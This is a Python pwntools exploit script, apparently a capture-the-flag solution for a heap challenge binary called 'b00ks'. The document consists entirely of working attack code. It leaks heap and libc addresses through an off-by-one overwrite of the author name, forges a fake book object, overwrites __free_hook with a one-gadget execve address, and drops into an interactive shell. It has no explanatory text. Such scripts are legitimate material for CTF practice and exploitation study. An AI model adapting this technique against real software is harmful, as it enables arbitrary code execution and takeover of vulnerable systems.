from pwn import *

context.log_level = 'debug'
p = process('b00ks')
#p = remote('127.0.0.1', 4000)
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
libc = ELF("/lib32/libc.so.6")
elf = ELF("b00ks")
#gdb.attach(p)

def creat_book(p, size):
	p.sendline("1")
	log.info(p.recvuntil(":"))
	p.sendline(str(size))
	log.info(p.recvuntil(":"))
	p.sendline("name")
	log.info(p.recvuntil(":"))
	p.sendline(str(size))
	log.info(p.recvuntil(":"))
	p.sendline("description")
	log.info(p.recvuntil(">"))

def leakSecondAddr(p):
	p.sendline("4")
	log.info(p.recvuntil("Author: "))
	msg = p.recvline()
	log.info(p.recvuntil(">"))
	msg = msg.split('A'*32)[1].strip("\n")
	addr = u64(msg.ljust(8,"\x00"))
	log.success("Leaked address of struct object : " + hex(addr))
	return addr

def memleak2(p):
     p.sendline("4")
     p.recvuntil("Name: ")
     msg=p.recvline().strip("\n")
     msg=u64(msg.ljust(8, "\x00"))
     log.info(p.recv(timeout = 1))
     log.success("Leaked address of allocated area " + hex(msg))
     return msg

def fake_obj(p, payload, index):
     log.progress("Editing description")
     p.sendline("3")
     log.info(p.recvuntil(":"))
     p.sendline(str(index))
     log.info(p.recvuntil(":"))
     p.sendline(payload)

def change_ptr(p):
     log.progress("Changing the struct pointer")
     p.sendline("5")
     log.info(p.recvuntil(":"))
     p.sendline("A"*32)
     log.info(p.recvuntil(">"))

def release(p):
	p.sendline("2")
	log.info(p.recvuntil(":"))
	p.sendline("2")

log.info(p.recvuntil(":"))
#gdb.attach(p)
p.sendline("A"*32)
log.info(p.recvuntil(">"))
creat_book(p, 140)
log.info("creat book done")
addr = leakSecondAddr(p) + 0x38 
#gdb.attach(p)
creat_book(p, 0x21000)
payload = "A"*80 + p64(0x01) + p64(addr)*2 + p64(0xffff)
fake_obj(p, payload, 1)
#raw_input("###")
change_ptr(p)  
addr = memleak2(p)
log.info(hex(addr))

libc_base = addr - 0x5A7010
log.info("libcbase: %s" % hex(libc_base))
free_hook = libc.symbols['__free_hook'] + libc_base
execve_addr = libc_base + 0x3fd27
log.info("free_hook: %s" % hex(free_hook)) 
log.info("execve_addr: %s" % hex(execve_addr))

#gdb.attach(p)
payload = p64(free_hook) * 2
fake_obj(p, payload, 1)
payload = p64(execve_addr)

log.info(p.recvuntil(">"))

gdb.attach(p)

fake_obj(p, payload, 2)
#release(p)
#gdb.attach(p)
p.interactive()

